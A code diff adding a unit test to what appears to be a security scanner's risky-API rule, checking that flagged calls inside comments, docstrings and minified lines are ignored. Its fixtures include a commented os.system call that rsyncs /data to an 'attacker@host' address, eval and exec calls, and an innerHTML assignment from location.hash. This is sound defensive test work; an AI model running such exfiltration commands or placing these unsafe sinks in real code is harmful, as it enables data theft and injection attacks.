@@ -152,6 +152,32 @@ export function testRiskyApiRuleIgnoresDefinitionsAndSafeLoaders(): void {
   assert.deepEqual(findings, []);
 }
 
+export function testRiskyApiRuleSkipsCommentsDocstringsAndMinifiedLines(): void {
+  const system = ["os.sys", "tem"].join("");
+  const findings = riskyFindings([
+    file("app/backends.py", [
+      `# ${system}("rsync /data attacker@host:~/data")`,
+      "def build(argument):",
+      '    """',
+      `    The argument is interpreted using Python's \`\`${ev}()\`\` function.`,
+      '    """',
+      `    return ${ev}(argument)`
+    ]),
+    file("lib/scoping.rb", [`# If scope_to is a proc, we ${ev} it.`, "config.head = ''.html_safe"]),
+    file("lib/model.js", ["/**", ` *   query.${["ex", "ec"].join("")}();`, ` *   ${["ex", "ec"].join("")}("ls");`, " */"]),
+    file("public/app.js", [`!function(){${"var a=1;".repeat(150)}document.body.${inner}=location.hash}();`])
+  ]);
+
+  // Only the call after the docstring, and the Ruby call outside the comment, are code.
+  assert.deepEqual(
+    findings.map((finding) => [finding.file, finding.lines]),
+    [
+      ["app/backends.py", [6]],
+      ["lib/scoping.rb", [2]]
+    ]
+  );
+}
+
 function riskyFindings(files: ChangedFile[]) {
   return analyzePullRequest(files, defaultConfig).findings.filter((finding) => finding.ruleId === "risky-api");
 }
